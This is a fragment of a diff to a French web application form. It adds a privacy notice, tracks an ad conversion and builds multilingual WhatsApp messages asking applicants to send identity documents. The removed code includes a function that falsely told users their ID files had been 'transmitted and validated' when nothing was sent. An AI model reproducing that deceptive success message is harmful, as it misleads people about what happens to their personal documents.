+                <strong>3. Pièces d'identité :</strong> Les pièces justificatives transmises via notre canal direct (WhatsApp) sont conservées de manière sécurisée et ne servent qu'à valider l'authenticité du porteur de projet dans le cadre de notre engagement de sincérité.<br><br>
+                <em>Pour toute question relative à vos données, notre équipe de terrain reste à votre disposition.</em>
+            </p>
+        `;
+        modal.style.display = 'flex';
+    }
+
     async function validateAndSubmit(e) {
         e.preventDefault();
 
@@ -1077,15 +1139,15 @@
             
             if (response.ok || response.status === 200) {
                 if(typeof gtag === 'function'){ gtag('event', 'conversion', {'send_to': 'AW-18121475138/vGqNCOf1r_kZELqR9-8_'}); }
-
-            setTimeout(() => {
+                
+                setTimeout(() => {
                     loadingContent.style.display = 'none';
                     document.getElementById('refCodeDisplay').innerText = generatedRefCode;
                     
                     const clientNom = document.getElementById('inputNom').value || "Client";
                     const codeCreatorVal = document.getElementById('createurField').value;
 
-                    // Récupération dynamique de la langue active
+                    // Traduction dynamique du message WhatsApp selon la langue active
                     let currentLang = 'fr';
                     const googCombo = document.querySelector('.goog-te-combo');
                     if (googCombo && googCombo.value) {
@@ -1099,7 +1161,7 @@
                     if (currentLang === 'es') {
                         texteWhatsApp = `Hola, mi nombre es ${clientNom}. Mi código de referencia es ${generatedRefCode}. ${codeCreatorVal ? `Código creador: ${codeCreatorVal}. ` : ''}Deseo finalizar la verificación de mi expediente y enviar mis documentos de identidad.`;
                     } else if (currentLang === 'pt') {
-                        texteWhatsApp = `Olá, meu nome é ${clientNom}. Meu código de referência é ${generatedRefCode}. ${codeCreatorVal ? `Código do criador: ${codeCreatorVal}. ` : ''}Desejo a verificação do meu dossiê e enviar meus documentos de identidade.`;
+                        texteWhatsApp = `Olá, meu nome é ${clientNom}. Meu código de referência é ${generatedRefCode}. ${codeCreatorVal ? `Código do criador: ${codeCreatorVal}. ` : ''}Deseo a verificação do meu dossiê e enviar meus documentos de identidade.`;
                     } else if (currentLang === 'en' || currentLang === 'de' || currentLang === 'it' || currentLang === 'se') {
                         texteWhatsApp = `Hello, my name is ${clientNom}. My reference code is ${generatedRefCode}. ${codeCreatorVal ? `Creator code: ${codeCreatorVal}. ` : ''}I would like to finalize my application verification and send my identity documents.`;
                     } else {
@@ -1119,22 +1181,6 @@
             alert("Erreur de connexion réseau lors de l'envoi du dossier.");
             loaderOverlay.style.display = 'none';
         }
-    }
-
-    function sendFormAndFilesByEmail() {
-        const fileInput = document.getElementById('idFileDoc');
-        if(fileInput.files.length === 0) {
-            alert("Veuillez sélectionner au moins un fichier (pièce d'identité) à joindre.");
-            return;
-        }
-
-        const clientNom = document.getElementById('inputNom').value;
-        
-        alert(`Succès ! Le dossier de ${clientNom} ainsi que les ${fileInput.files.length} pièce(s) d'identité ont été transmis et validés avec succès (Réf: ${generatedRefCode}).`);
-        
-        // Efface proprement la sélection persistante des fichiers bloqués
-        fileInput.value = "";
-        resetAll();
     }
 </script>
 </body>
